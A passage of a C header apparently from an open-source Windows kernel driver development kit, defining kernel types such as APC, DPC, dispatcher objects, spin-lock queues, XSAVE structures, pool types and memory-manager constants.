  ULONG NumberParameters;
  ULONG ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];
} EXCEPTION_RECORD32, *PEXCEPTION_RECORD32;

typedef struct _EXCEPTION_RECORD64 {
  NTSTATUS ExceptionCode;
  ULONG ExceptionFlags;
  ULONG64 ExceptionRecord;
  ULONG64 ExceptionAddress;
  ULONG NumberParameters;
  ULONG __unusedAlignment;
  ULONG64 ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];
} EXCEPTION_RECORD64, *PEXCEPTION_RECORD64;

typedef struct _EXCEPTION_POINTERS {
  PEXCEPTION_RECORD ExceptionRecord;
  PCONTEXT ContextRecord;
} EXCEPTION_POINTERS, *PEXCEPTION_POINTERS;

typedef enum _KBUGCHECK_CALLBACK_REASON {
  KbCallbackInvalid,
  KbCallbackReserved1,
  KbCallbackSecondaryDumpData,
  KbCallbackDumpIo,
  KbCallbackAddPages,
  KbCallbackSecondaryMultiPartDumpData,
  KbCallbackRemovePages,
  KbCallbackTriageDumpData
} KBUGCHECK_CALLBACK_REASON;

struct _KBUGCHECK_REASON_CALLBACK_RECORD;

typedef VOID
(NTAPI KBUGCHECK_REASON_CALLBACK_ROUTINE)(
  IN KBUGCHECK_CALLBACK_REASON Reason,
  IN struct _KBUGCHECK_REASON_CALLBACK_RECORD *Record,
  IN OUT PVOID ReasonSpecificData,
  IN ULONG ReasonSpecificDataLength);
typedef KBUGCHECK_REASON_CALLBACK_ROUTINE *PKBUGCHECK_REASON_CALLBACK_ROUTINE;

typedef struct _KBUGCHECK_ADD_PAGES {
  IN OUT PVOID Context;
  IN OUT ULONG Flags;
  IN ULONG BugCheckCode;
  OUT ULONG_PTR Address;
  OUT ULONG_PTR Count;
} KBUGCHECK_ADD_PAGES, *PKBUGCHECK_ADD_PAGES;

typedef struct _KBUGCHECK_SECONDARY_DUMP_DATA {
  IN PVOID InBuffer;
  IN ULONG InBufferLength;
  IN ULONG MaximumAllowed;
  OUT GUID Guid;
  OUT PVOID OutBuffer;
  OUT ULONG OutBufferLength;
} KBUGCHECK_SECONDARY_DUMP_DATA, *PKBUGCHECK_SECONDARY_DUMP_DATA;

typedef enum _KBUGCHECK_DUMP_IO_TYPE {
  KbDumpIoInvalid,
  KbDumpIoHeader,
  KbDumpIoBody,
  KbDumpIoSecondaryData,
  KbDumpIoComplete
} KBUGCHECK_DUMP_IO_TYPE;

typedef struct _KBUGCHECK_DUMP_IO {
  IN ULONG64 Offset;
  IN PVOID Buffer;
  IN ULONG BufferLength;
  IN KBUGCHECK_DUMP_IO_TYPE Type;
} KBUGCHECK_DUMP_IO, *PKBUGCHECK_DUMP_IO;

#define KB_ADD_PAGES_FLAG_VIRTUAL_ADDRESS         0x00000001UL
#define KB_ADD_PAGES_FLAG_PHYSICAL_ADDRESS        0x00000002UL
#define KB_ADD_PAGES_FLAG_ADDITIONAL_RANGES_EXIST 0x80000000UL

typedef struct _KBUGCHECK_REASON_CALLBACK_RECORD {
  LIST_ENTRY Entry;
  PKBUGCHECK_REASON_CALLBACK_ROUTINE CallbackRoutine;
  PUCHAR Component;
  ULONG_PTR Checksum;
  KBUGCHECK_CALLBACK_REASON Reason;
  UCHAR State;
} KBUGCHECK_REASON_CALLBACK_RECORD, *PKBUGCHECK_REASON_CALLBACK_RECORD;

typedef enum _KBUGCHECK_BUFFER_DUMP_STATE {
  BufferEmpty,
  BufferInserted,
  BufferStarted,
  BufferFinished,
  BufferIncomplete
} KBUGCHECK_BUFFER_DUMP_STATE;

typedef VOID
(NTAPI KBUGCHECK_CALLBACK_ROUTINE)(
  IN PVOID Buffer,
  IN ULONG Length);
typedef KBUGCHECK_CALLBACK_ROUTINE *PKBUGCHECK_CALLBACK_ROUTINE;

typedef struct _KBUGCHECK_CALLBACK_RECORD {
  LIST_ENTRY Entry;
  PKBUGCHECK_CALLBACK_ROUTINE CallbackRoutine;
  PVOID Buffer;
  ULONG Length;
  PUCHAR Component;
  ULONG_PTR Checksum;
  UCHAR State;
} KBUGCHECK_CALLBACK_RECORD, *PKBUGCHECK_CALLBACK_RECORD;

typedef BOOLEAN
(NTAPI NMI_CALLBACK)(
  IN PVOID Context,
  IN BOOLEAN Handled);
typedef NMI_CALLBACK *PNMI_CALLBACK;

typedef enum _KE_PROCESSOR_CHANGE_NOTIFY_STATE {
  KeProcessorAddStartNotify = 0,
  KeProcessorAddCompleteNotify,
  KeProcessorAddFailureNotify
} KE_PROCESSOR_CHANGE_NOTIFY_STATE;

typedef struct _KE_PROCESSOR_CHANGE_NOTIFY_CONTEXT {
  KE_PROCESSOR_CHANGE_NOTIFY_STATE State;
  ULONG NtNumber;
  NTSTATUS Status;
#if (NTDDI_VERSION >= NTDDI_WIN7)
  PROCESSOR_NUMBER ProcNumber;
#endif
} KE_PROCESSOR_CHANGE_NOTIFY_CONTEXT, *PKE_PROCESSOR_CHANGE_NOTIFY_CONTEXT;

typedef VOID
(NTAPI PROCESSOR_CALLBACK_FUNCTION)(
  IN PVOID CallbackContext,
  IN PKE_PROCESSOR_CHANGE_NOTIFY_CONTEXT ChangeContext,
  IN OUT PNTSTATUS OperationStatus);
typedef PROCESSOR_CALLBACK_FUNCTION *PPROCESSOR_CALLBACK_FUNCTION;

#define KE_PROCESSOR_CHANGE_ADD_EXISTING         1

#define INVALID_PROCESSOR_INDEX     0xffffffff

typedef enum _KINTERRUPT_POLARITY {
  InterruptPolarityUnknown,
  InterruptActiveHigh,
  InterruptRisingEdge = InterruptActiveHigh,
  InterruptActiveLow,
  InterruptFallingEdge = InterruptActiveLow,
#if NTDDI_VERSION >= NTDDI_WIN8
  InterruptActiveBoth,
#endif
#if NTDDI_VERSION >= NTDDI_WINBLUE
  InterruptActiveBothTriggerLow = InterruptActiveBoth,
  InterruptActiveBothTriggerHigh
#endif
} KINTERRUPT_POLARITY, *PKINTERRUPT_POLARITY;

typedef enum _KPROFILE_SOURCE {
  ProfileTime,
  ProfileAlignmentFixup,
  ProfileTotalIssues,
  ProfilePipelineDry,
  ProfileLoadInstructions,
  ProfilePipelineFrozen,
  ProfileBranchInstructions,
  ProfileTotalNonissues,
  ProfileDcacheMisses,
  ProfileIcacheMisses,
  ProfileCacheMisses,
  ProfileBranchMispredictions,
  ProfileStoreInstructions,
  ProfileFpInstructions,
  ProfileIntegerInstructions,
  Profile2Issue,
  Profile3Issue,
  Profile4Issue,
  ProfileSpecialInstructions,
  ProfileTotalCycles,
  ProfileIcacheIssues,
  ProfileDcacheAccesses,
  ProfileMemoryBarrierCycles,
  ProfileLoadLinkedIssues,
  ProfileMaximum
} KPROFILE_SOURCE;

typedef enum _KWAIT_REASON {
  Executive,
  FreePage,
  PageIn,
  PoolAllocation,
  DelayExecution,
  Suspended,
  UserRequest,
  WrExecutive,
  WrFreePage,
  WrPageIn,
  WrPoolAllocation,
  WrDelayExecution,
  WrSuspended,
  WrUserRequest,
  WrSpare0,
  WrQueue,
  WrLpcReceive,
  WrLpcReply,
  WrVirtualMemory,
  WrPageOut,
  WrRendezvous,
  WrKeyedEvent,
  WrTerminated,
  WrProcessInSwap,
  WrCpuRateControl,
  WrCalloutStack,
  WrKernel,
  WrResource,
  WrPushLock,
  WrMutex,
  WrQuantumEnd,
  WrDispatchInt,
  WrPreempted,
  WrYieldExecution,
  WrFastMutex,
  WrGuardedMutex,
  WrRundown,
  WrAlertByThreadId,
  WrDeferredPreempt,
  WrPhysicalFault,
  MaximumWaitReason
} KWAIT_REASON;

typedef struct _KWAIT_BLOCK {
  LIST_ENTRY WaitListEntry;
  struct _KTHREAD *Thread;
  PVOID Object;
  struct _KWAIT_BLOCK *NextWaitBlock;
  USHORT WaitKey;
  UCHAR WaitType;
  volatile UCHAR BlockState;
#if defined(_WIN64)
  LONG SpareLong;
#endif
} KWAIT_BLOCK, *PKWAIT_BLOCK, *PRKWAIT_BLOCK;

typedef enum _KINTERRUPT_MODE {
  LevelSensitive,
  Latched
} KINTERRUPT_MODE;

#define THREAD_WAIT_OBJECTS 3

typedef VOID
(NTAPI KSTART_ROUTINE)(
  IN PVOID StartContext);
typedef KSTART_ROUTINE *PKSTART_ROUTINE;

typedef VOID
(NTAPI *PKINTERRUPT_ROUTINE)(
  VOID);

typedef BOOLEAN
(NTAPI KSERVICE_ROUTINE)(
  IN struct _KINTERRUPT *Interrupt,
  IN PVOID ServiceContext);
typedef KSERVICE_ROUTINE *PKSERVICE_ROUTINE;

typedef BOOLEAN
(NTAPI KMESSAGE_SERVICE_ROUTINE)(
  IN struct _KINTERRUPT *Interrupt,
  IN PVOID ServiceContext,
  IN ULONG MessageID);
typedef KMESSAGE_SERVICE_ROUTINE *PKMESSAGE_SERVICE_ROUTINE;

typedef enum _KD_OPTION {
  KD_OPTION_SET_BLOCK_ENABLE,
} KD_OPTION;

typedef VOID
(NTAPI *PKNORMAL_ROUTINE)(
  IN PVOID NormalContext OPTIONAL,
  IN PVOID SystemArgument1 OPTIONAL,
  IN PVOID SystemArgument2 OPTIONAL);

typedef VOID
(NTAPI *PKRUNDOWN_ROUTINE)(
  IN struct _KAPC *Apc);

typedef VOID
(NTAPI *PKKERNEL_ROUTINE)(
  IN struct _KAPC *Apc,
  IN OUT PKNORMAL_ROUTINE *NormalRoutine OPTIONAL,
  IN OUT PVOID *NormalContext OPTIONAL,
  IN OUT PVOID *SystemArgument1 OPTIONAL,
  IN OUT PVOID *SystemArgument2 OPTIONAL);

typedef struct _KAPC {
  UCHAR Type;
  UCHAR SpareByte0;
  UCHAR Size;
  UCHAR SpareByte1;
  ULONG SpareLong0;
  struct _KTHREAD *Thread;
  LIST_ENTRY ApcListEntry;
  PKKERNEL_ROUTINE KernelRoutine;
  PKRUNDOWN_ROUTINE RundownRoutine;
  PKNORMAL_ROUTINE NormalRoutine;
  PVOID NormalContext;
  PVOID SystemArgument1;
  PVOID SystemArgument2;
  CCHAR ApcStateIndex;
  KPROCESSOR_MODE ApcMode;
  BOOLEAN Inserted;
} KAPC, *PKAPC, *RESTRICTED_POINTER PRKAPC;

#define KAPC_OFFSET_TO_SPARE_BYTE0 FIELD_OFFSET(KAPC, SpareByte0)
#define KAPC_OFFSET_TO_SPARE_BYTE1 FIELD_OFFSET(KAPC, SpareByte1)
#define KAPC_OFFSET_TO_SPARE_LONG FIELD_OFFSET(KAPC, SpareLong0)
#define KAPC_OFFSET_TO_SYSTEMARGUMENT1 FIELD_OFFSET(KAPC, SystemArgument1)
#define KAPC_OFFSET_TO_SYSTEMARGUMENT2 FIELD_OFFSET(KAPC, SystemArgument2)
#define KAPC_OFFSET_TO_APCSTATEINDEX FIELD_OFFSET(KAPC, ApcStateIndex)
#define KAPC_ACTUAL_LENGTH (FIELD_OFFSET(KAPC, Inserted) + sizeof(BOOLEAN))

typedef struct _KDEVICE_QUEUE_ENTRY {
  LIST_ENTRY DeviceListEntry;
  ULONG SortKey;
  BOOLEAN Inserted;
} KDEVICE_QUEUE_ENTRY, *PKDEVICE_QUEUE_ENTRY,
*RESTRICTED_POINTER PRKDEVICE_QUEUE_ENTRY;

typedef PVOID PKIPI_CONTEXT;

typedef VOID
(NTAPI *PKIPI_WORKER)(
  IN OUT PKIPI_CONTEXT PacketContext,
  IN PVOID Parameter1 OPTIONAL,
  IN PVOID Parameter2 OPTIONAL,
  IN PVOID Parameter3 OPTIONAL);

typedef struct _KIPI_COUNTS {
  ULONG Freeze;
  ULONG Packet;
  ULONG DPC;
  ULONG APC;
  ULONG FlushSingleTb;
  ULONG FlushMultipleTb;
  ULONG FlushEntireTb;
  ULONG GenericCall;
  ULONG ChangeColor;
  ULONG SweepDcache;
  ULONG SweepIcache;
  ULONG SweepIcacheRange;
  ULONG FlushIoBuffers;
  ULONG GratuitousDPC;
} KIPI_COUNTS, *PKIPI_COUNTS;

typedef ULONG_PTR
(NTAPI KIPI_BROADCAST_WORKER)(
  IN ULONG_PTR Argument);
typedef KIPI_BROADCAST_WORKER *PKIPI_BROADCAST_WORKER;

typedef ULONG_PTR KSPIN_LOCK, *PKSPIN_LOCK;

typedef struct _KSPIN_LOCK_QUEUE {
  struct _KSPIN_LOCK_QUEUE *volatile Next;
  PKSPIN_LOCK volatile Lock;
} KSPIN_LOCK_QUEUE, *PKSPIN_LOCK_QUEUE;

typedef struct _KLOCK_QUEUE_HANDLE {
  KSPIN_LOCK_QUEUE LockQueue;
  KIRQL OldIrql;
} KLOCK_QUEUE_HANDLE, *PKLOCK_QUEUE_HANDLE;

#if defined(_AMD64_)

typedef ULONG64 KSPIN_LOCK_QUEUE_NUMBER;

#define LockQueueUnusedSpare0 0
#define LockQueueUnusedSpare1 1
#define LockQueueUnusedSpare2 2
#define LockQueueUnusedSpare3 3
#define LockQueueVacbLock 4
#define LockQueueMasterLock 5
#define LockQueueNonPagedPoolLock 6
#define LockQueueIoCancelLock 7
#define LockQueueUnusedSpare8 8
#define LockQueueIoVpbLock 9
#define LockQueueIoDatabaseLock 10
#define LockQueueIoCompletionLock 11
#define LockQueueNtfsStructLock 12
#define LockQueueAfdWorkQueueLock 13
#define LockQueueBcbLock 14
#define LockQueueUnusedSpare15 15
#define LockQueueUnusedSpare16 16
#define LockQueueMaximumLock 17

#else

typedef enum _KSPIN_LOCK_QUEUE_NUMBER {
  LockQueueUnusedSpare0,
  LockQueueUnusedSpare1,
  LockQueueUnusedSpare2,
  LockQueueUnusedSpare3,
  LockQueueVacbLock,
  LockQueueMasterLock,
  LockQueueNonPagedPoolLock,
  LockQueueIoCancelLock,
  LockQueueUnusedSpare8,
  LockQueueIoVpbLock,
  LockQueueIoDatabaseLock,
  LockQueueIoCompletionLock,
  LockQueueNtfsStructLock,
  LockQueueAfdWorkQueueLock,
  LockQueueBcbLock,
  LockQueueUnusedSpare15,
  LockQueueUnusedSpare16,
  LockQueueMaximumLock = LockQueueUnusedSpare16 + 1
} KSPIN_LOCK_QUEUE_NUMBER, *PKSPIN_LOCK_QUEUE_NUMBER;

#endif /* defined(_AMD64_) */

typedef VOID
(NTAPI KDEFERRED_ROUTINE)(
  IN struct _KDPC *Dpc,
  IN PVOID DeferredContext OPTIONAL,
  IN PVOID SystemArgument1 OPTIONAL,
  IN PVOID SystemArgument2 OPTIONAL);
typedef KDEFERRED_ROUTINE *PKDEFERRED_ROUTINE;

typedef enum _KDPC_IMPORTANCE {
  LowImportance,
  MediumImportance,
  HighImportance,
  MediumHighImportance
} KDPC_IMPORTANCE;

typedef struct _KDPC {
  UCHAR Type;
  UCHAR Importance;
  volatile USHORT Number;
  LIST_ENTRY DpcListEntry;
  PKDEFERRED_ROUTINE DeferredRoutine;
  PVOID DeferredContext;
  PVOID SystemArgument1;
  PVOID SystemArgument2;
  volatile PVOID DpcData;
} KDPC, *PKDPC, *RESTRICTED_POINTER PRKDPC;

typedef struct _KDPC_WATCHDOG_INFORMATION {
  ULONG DpcTimeLimit;
  ULONG DpcTimeCount;
  ULONG DpcWatchdogLimit;
  ULONG DpcWatchdogCount;
  ULONG Reserved;
} KDPC_WATCHDOG_INFORMATION, *PKDPC_WATCHDOG_INFORMATION;

typedef struct _KDEVICE_QUEUE {
  CSHORT Type;
  CSHORT Size;
  LIST_ENTRY DeviceListHead;
  KSPIN_LOCK Lock;
# if defined(_AMD64_)
  _ANONYMOUS_UNION union {
    BOOLEAN Busy;
    _ANONYMOUS_STRUCT struct {
      LONG64 Reserved:8;
      LONG64 Hint:56;
    } DUMMYSTRUCTNAME;
  } DUMMYUNIONNAME;
# else
  BOOLEAN Busy;
# endif
} KDEVICE_QUEUE, *PKDEVICE_QUEUE, *RESTRICTED_POINTER PRKDEVICE_QUEUE;

#define TIMER_EXPIRED_INDEX_BITS        6
#define TIMER_PROCESSOR_INDEX_BITS      5

typedef struct _DISPATCHER_HEADER {
  _ANONYMOUS_UNION union {
    _ANONYMOUS_STRUCT struct {
      UCHAR Type;
      _ANONYMOUS_UNION union {
        _ANONYMOUS_UNION union {
          UCHAR TimerControlFlags;
          _ANONYMOUS_STRUCT struct {
            UCHAR Absolute:1;
            UCHAR Coalescable:1;
            UCHAR KeepShifting:1;
            UCHAR EncodedTolerableDelay:5;
          } DUMMYSTRUCTNAME;
        } DUMMYUNIONNAME;
        UCHAR Abandoned;
#if (NTDDI_VERSION < NTDDI_WIN7)
        UCHAR NpxIrql;
#endif
        BOOLEAN Signalling;
      } DUMMYUNIONNAME;
      _ANONYMOUS_UNION union {
        _ANONYMOUS_UNION union {
          UCHAR ThreadControlFlags;
          _ANONYMOUS_STRUCT struct {
            UCHAR CpuThrottled:1;
            UCHAR CycleProfiling:1;
            UCHAR CounterProfiling:1;
            UCHAR Reserved:5;
          } DUMMYSTRUCTNAME;
        } DUMMYUNIONNAME;
        UCHAR Size;
        UCHAR Hand;
      } DUMMYUNIONNAME2;
      _ANONYMOUS_UNION union {
#if (NTDDI_VERSION >= NTDDI_WIN7)
        _ANONYMOUS_UNION union {
          UCHAR TimerMiscFlags;
          _ANONYMOUS_STRUCT struct {
#if !defined(_X86_)
            UCHAR Index:TIMER_EXPIRED_INDEX_BITS;
#else
            UCHAR Index:1;
            UCHAR Processor:TIMER_PROCESSOR_INDEX_BITS;
#endif
            UCHAR Inserted:1;
            volatile UCHAR Expired:1;
          } DUMMYSTRUCTNAME;
        } DUMMYUNIONNAME;
#else
        /* Pre Win7 compatibility fix to latest WDK */
        UCHAR Inserted;
#endif
        _ANONYMOUS_UNION union {
          BOOLEAN DebugActive;
          _ANONYMOUS_STRUCT struct {
            BOOLEAN ActiveDR7:1;
            BOOLEAN Instrumented:1;
            BOOLEAN Reserved2:4;
            BOOLEAN UmsScheduled:1;
            BOOLEAN UmsPrimary:1;
          } DUMMYSTRUCTNAME;
        } DUMMYUNIONNAME; /* should probably be DUMMYUNIONNAME2, but this is what WDK says */
        BOOLEAN DpcActive;
      } DUMMYUNIONNAME3;
    } DUMMYSTRUCTNAME;
    volatile LONG Lock;
  } DUMMYUNIONNAME;
  LONG SignalState;
  LIST_ENTRY WaitListHead;
} DISPATCHER_HEADER, *PDISPATCHER_HEADER;

typedef struct _KEVENT {
  DISPATCHER_HEADER Header;
} KEVENT, *PKEVENT, *RESTRICTED_POINTER PRKEVENT;

typedef struct _KSEMAPHORE {
  DISPATCHER_HEADER Header;
  LONG Limit;
} KSEMAPHORE, *PKSEMAPHORE, *RESTRICTED_POINTER PRKSEMAPHORE;

#define KSEMAPHORE_ACTUAL_LENGTH (FIELD_OFFSET(KSEMAPHORE, Limit) + sizeof(LONG))

typedef struct _KGATE {
  DISPATCHER_HEADER Header;
} KGATE, *PKGATE, *RESTRICTED_POINTER PRKGATE;

typedef struct _KGUARDED_MUTEX {
  volatile LONG Count;
  PKTHREAD Owner;
  ULONG Contention;
  KGATE Gate;
  _ANONYMOUS_UNION union {
    _ANONYMOUS_STRUCT struct {
      SHORT KernelApcDisable;
      SHORT SpecialApcDisable;
    } DUMMYSTRUCTNAME;
    ULONG CombinedApcDisable;
  } DUMMYUNIONNAME;
} KGUARDED_MUTEX, *PKGUARDED_MUTEX;

typedef struct _KMUTANT {
  DISPATCHER_HEADER Header;
  LIST_ENTRY MutantListEntry;
  struct _KTHREAD *RESTRICTED_POINTER OwnerThread;
  BOOLEAN Abandoned;
  UCHAR ApcDisable;
} KMUTANT, *PKMUTANT, *RESTRICTED_POINTER PRKMUTANT, KMUTEX, *PKMUTEX, *RESTRICTED_POINTER PRKMUTEX;

#define TIMER_TABLE_SIZE 512
#define TIMER_TABLE_SHIFT 9

typedef struct _KTIMER {
  DISPATCHER_HEADER Header;
  ULARGE_INTEGER DueTime;
  LIST_ENTRY TimerListEntry;
  struct _KDPC *Dpc;
# if !defined(_X86_)
  ULONG Processor;
# endif
  ULONG Period;
} KTIMER, *PKTIMER, *RESTRICTED_POINTER PRKTIMER;

typedef enum _LOCK_OPERATION {
  IoReadAccess,
  IoWriteAccess,
  IoModifyAccess
} LOCK_OPERATION;

#define KTIMER_ACTUAL_LENGTH (FIELD_OFFSET(KTIMER, Period) + sizeof(LONG))

typedef BOOLEAN (NTAPI KSYNCHRONIZE_ROUTINE)(PVOID SynchronizeContext);
typedef KSYNCHRONIZE_ROUTINE *PKSYNCHRONIZE_ROUTINE;

typedef enum _POOL_TYPE {
  NonPagedPool,
  NonPagedPoolExecute = NonPagedPool,
  PagedPool,
  NonPagedPoolMustSucceed,
  DontUseThisType,
  NonPagedPoolCacheAligned,
  PagedPoolCacheAligned,
  NonPagedPoolCacheAlignedMustS,
  MaxPoolType,
  NonPagedPoolBase = 0,
  NonPagedPoolBaseMustSucceed = 2,
  NonPagedPoolBaseCacheAligned = 4,
  NonPagedPoolBaseCacheAlignedMustS = 6,
  NonPagedPoolSession = 32,
  PagedPoolSession,
  NonPagedPoolMustSucceedSession,
  DontUseThisTypeSession,
  NonPagedPoolCacheAlignedSession,
  PagedPoolCacheAlignedSession,
  NonPagedPoolCacheAlignedMustSSession,
  NonPagedPoolNx = 512,
  NonPagedPoolNxCacheAligned = 516,
  NonPagedPoolSessionNx = 544,
} POOL_TYPE;

typedef enum _ALTERNATIVE_ARCHITECTURE_TYPE {
  StandardDesign,
  NEC98x86,
  EndAlternatives
} ALTERNATIVE_ARCHITECTURE_TYPE;

#ifndef _X86_

#ifndef IsNEC_98
#define IsNEC_98 (FALSE)
#endif

#ifndef IsNotNEC_98
#define IsNotNEC_98 (TRUE)
#endif

#ifndef SetNEC_98
#define SetNEC_98
#endif

#ifndef SetNotNEC_98
#define SetNotNEC_98
#endif

#endif

typedef struct _KSYSTEM_TIME {
  ULONG LowPart;
  LONG High1Time;
  LONG High2Time;
} KSYSTEM_TIME, *PKSYSTEM_TIME;

typedef struct DECLSPEC_ALIGN(16) _M128A {
  ULONGLONG Low;
  LONGLONG High;
} M128A, *PM128A;

typedef struct DECLSPEC_ALIGN(16) _XSAVE_FORMAT {
  USHORT ControlWord;
  USHORT StatusWord;
  UCHAR TagWord;
  UCHAR Reserved1;
  USHORT ErrorOpcode;
  ULONG ErrorOffset;
  USHORT ErrorSelector;
  USHORT Reserved2;
  ULONG DataOffset;
  USHORT DataSelector;
  USHORT Reserved3;
  ULONG MxCsr;
  ULONG MxCsr_Mask;
  M128A FloatRegisters[8];
#if defined(_WIN64)
  M128A XmmRegisters[16];
  UCHAR Reserved4[96];
#else
  M128A XmmRegisters[8];
  UCHAR Reserved4[192];
  ULONG StackControl[7];
  ULONG Cr0NpxState;
#endif
} XSAVE_FORMAT, *PXSAVE_FORMAT;

typedef struct DECLSPEC_ALIGN(8) _XSAVE_AREA_HEADER {
  ULONG64 Mask;
  ULONG64 Reserved[7];
} XSAVE_AREA_HEADER, *PXSAVE_AREA_HEADER;

typedef struct DECLSPEC_ALIGN(16) _XSAVE_AREA {
  XSAVE_FORMAT LegacyState;
  XSAVE_AREA_HEADER Header;
} XSAVE_AREA, *PXSAVE_AREA;

typedef struct _XSTATE_CONTEXT {
  ULONG64 Mask;
  ULONG Length;
  ULONG Reserved1;
  PXSAVE_AREA Area;
#if defined(_X86_)
  ULONG Reserved2;
#endif
  PVOID Buffer;
#if defined(_X86_)
  ULONG Reserved3;
#endif
} XSTATE_CONTEXT, *PXSTATE_CONTEXT;

typedef struct _XSTATE_SAVE {
#if defined(_AMD64_)
  struct _XSTATE_SAVE* Prev;
  struct _KTHREAD* Thread;
  UCHAR Level;
  XSTATE_CONTEXT XStateContext;
#elif defined(_IA64_)
  ULONG Dummy;
#elif defined(_X86_)
  _ANONYMOUS_UNION union {
    _ANONYMOUS_STRUCT struct {
      LONG64 Reserved1;
      ULONG Reserved2;
      struct _XSTATE_SAVE* Prev;
      PXSAVE_AREA Reserved3;
      struct _KTHREAD* Thread;
      PVOID Reserved4;
      UCHAR Level;
    } DUMMYSTRUCTNAME;
    XSTATE_CONTEXT XStateContext;
  } DUMMYUNIONNAME;
#endif
} XSTATE_SAVE, *PXSTATE_SAVE;

#ifdef _X86_

#define MAXIMUM_SUPPORTED_EXTENSION  512

#if !defined(__midl) && !defined(MIDL_PASS)
C_ASSERT(sizeof(XSAVE_FORMAT) == MAXIMUM_SUPPORTED_EXTENSION);
#endif

#endif /* _X86_ */

#define XSAVE_ALIGN                    64
#define MINIMAL_XSTATE_AREA_LENGTH     sizeof(XSAVE_AREA)

#if !defined(__midl) && !defined(MIDL_PASS)
C_ASSERT((sizeof(XSAVE_FORMAT) & (XSAVE_ALIGN - 1)) == 0);
C_ASSERT((FIELD_OFFSET(XSAVE_AREA, Header) & (XSAVE_ALIGN - 1)) == 0);
C_ASSERT(MINIMAL_XSTATE_AREA_LENGTH == 512 + 64);
#endif

typedef struct _CONTEXT_CHUNK {
  LONG Offset;
  ULONG Length;
} CONTEXT_CHUNK, *PCONTEXT_CHUNK;

typedef struct _CONTEXT_EX {
  CONTEXT_CHUNK All;
  CONTEXT_CHUNK Legacy;
  CONTEXT_CHUNK XState;
} CONTEXT_EX, *PCONTEXT_EX;

#define CONTEXT_EX_LENGTH         ALIGN_UP_BY(sizeof(CONTEXT_EX), STACK_ALIGN)

#if (NTDDI_VERSION >= NTDDI_VISTA)
extern NTSYSAPI volatile CCHAR KeNumberProcessors;
#elif (NTDDI_VERSION >= NTDDI_WINXP)
extern NTSYSAPI CCHAR KeNumberProcessors;
#else
extern PCCHAR KeNumberProcessors;
#endif


/******************************************************************************
 *                         Memory manager Types                               *
 ******************************************************************************/

#if (NTDDI_VERSION >= NTDDI_WIN2K)
typedef ULONG NODE_REQUIREMENT;
#define MM_ANY_NODE_OK                           0x80000000
#endif

#define MM_DONT_ZERO_ALLOCATION                  0x00000001
#define MM_ALLOCATE_FROM_LOCAL_NODE_ONLY         0x00000002
#define MM_ALLOCATE_FULLY_REQUIRED               0x00000004
#define MM_ALLOCATE_NO_WAIT                      0x00000008
#define MM_ALLOCATE_PREFER_CONTIGUOUS            0x00000010
#define MM_ALLOCATE_REQUIRE_CONTIGUOUS_CHUNKS    0x00000020

#define MDL_MAPPED_TO_SYSTEM_VA     0x0001
#define MDL_PAGES_LOCKED            0x0002
#define MDL_SOURCE_IS_NONPAGED_POOL 0x0004
#define MDL_ALLOCATED_FIXED_SIZE    0x0008
#define MDL_PARTIAL                 0x0010
#define MDL_PARTIAL_HAS_BEEN_MAPPED 0x0020
#define MDL_IO_PAGE_READ            0x0040
#define MDL_WRITE_OPERATION         0x0080
#define MDL_PARENT_MAPPED_SYSTEM_VA 0x0100
#define MDL_FREE_EXTRA_PTES         0x0200
#define MDL_DESCRIBES_AWE           0x0400
#define MDL_IO_SPACE                0x0800
#define MDL_NETWORK_HEADER          0x1000
#define MDL_MAPPING_CAN_FAIL        0x2000
#define MDL_ALLOCATED_MUST_SUCCEED  0x4000
#define MDL_INTERNAL                0x8000

#define MDL_MAPPING_FLAGS (MDL_MAPPED_TO_SYSTEM_VA     | \
                           MDL_PAGES_LOCKED            | \
                           MDL_SOURCE_IS_NONPAGED_POOL | \
                           MDL_PARTIAL_HAS_BEEN_MAPPED | \
                           MDL_PARENT_MAPPED_SYSTEM_VA | \
                           MDL_SYSTEM_VA               | \
                           MDL_IO_SPACE)

#define FLUSH_MULTIPLE_MAXIMUM       32

/* Section access rights */
#define SECTION_QUERY                0x0001
#define SECTION_MAP_WRITE            0x0002
#define SECTION_MAP_READ             0x0004
#define SECTION_MAP_EXECUTE          0x0008
#define SECTION_EXTEND_SIZE          0x0010
#define SECTION_MAP_EXECUTE_EXPLICIT 0x0020

#define SECTION_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED|SECTION_QUERY| \
                            SECTION_MAP_WRITE |                     \
                            SECTION_MAP_READ |                      \
                            SECTION_MAP_EXECUTE |                   \
                            SECTION_EXTEND_SIZE)

#define SESSION_QUERY_ACCESS         0x0001
#define SESSION_MODIFY_ACCESS        0x0002

#define SESSION_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED |  \
                            SESSION_QUERY_ACCESS     |  \
                            SESSION_MODIFY_ACCESS)

#define SEGMENT_ALL_ACCESS SECTION_ALL_ACCESS

#define PAGE_NOACCESS          0x01
#define PAGE_READONLY          0x02
#define PAGE_READWRITE         0x04
#define PAGE_WRITECOPY         0x08
#define PAGE_EXECUTE           0x10
#define PAGE_EXECUTE_READ      0x20
#define PAGE_EXECUTE_READWRITE 0x40
#define PAGE_EXECUTE_WRITECOPY 0x80
#define PAGE_GUARD            0x100
#define PAGE_NOCACHE          0x200
#define PAGE_WRITECOMBINE     0x400

#define MEM_COMMIT           0x1000
#define MEM_RESERVE          0x2000
#define MEM_DECOMMIT         0x4000
#define MEM_RELEASE          0x8000
#define MEM_FREE            0x10000
#define MEM_PRIVATE         0x20000
#define MEM_MAPPED          0x40000
#define MEM_RESET           0x80000
#define MEM_TOP_DOWN       0x100000
#define MEM_LARGE_PAGES  0x20000000
#define MEM_4MB_PAGES    0x80000000

#define SEC_RESERVE       0x4000000
#define SEC_COMMIT        0x8000000
#define SEC_LARGE_PAGES  0x80000000

/* Section map options */
typedef enum _SECTION_INHERIT {
  ViewShare = 1,
  ViewUnmap = 2
} SECTION_INHERIT;

typedef ULONG PFN_COUNT;
typedef LONG_PTR SPFN_NUMBER, *PSPFN_NUMBER;
typedef ULONG_PTR PFN_NUMBER, *PPFN_NUMBER;

typedef struct _MDL {
  struct _MDL *Next;
  CSHORT Size;
  CSHORT MdlFlags;
  struct _EPROCESS *Process;
  PVOID MappedSystemVa;
  PVOID StartVa;
  ULONG ByteCount;
  ULONG ByteOffset;
} MDL, *PMDL;
typedef MDL *PMDLX;

typedef enum _MEMORY_CACHING_TYPE_ORIG {
  MmFrameBufferCached = 2
} MEMORY_CACHING_TYPE_ORIG;

typedef enum _MEMORY_CACHING_TYPE {
  MmNonCached = FALSE,
  MmCached = TRUE,
  MmWriteCombined = MmFrameBufferCached,
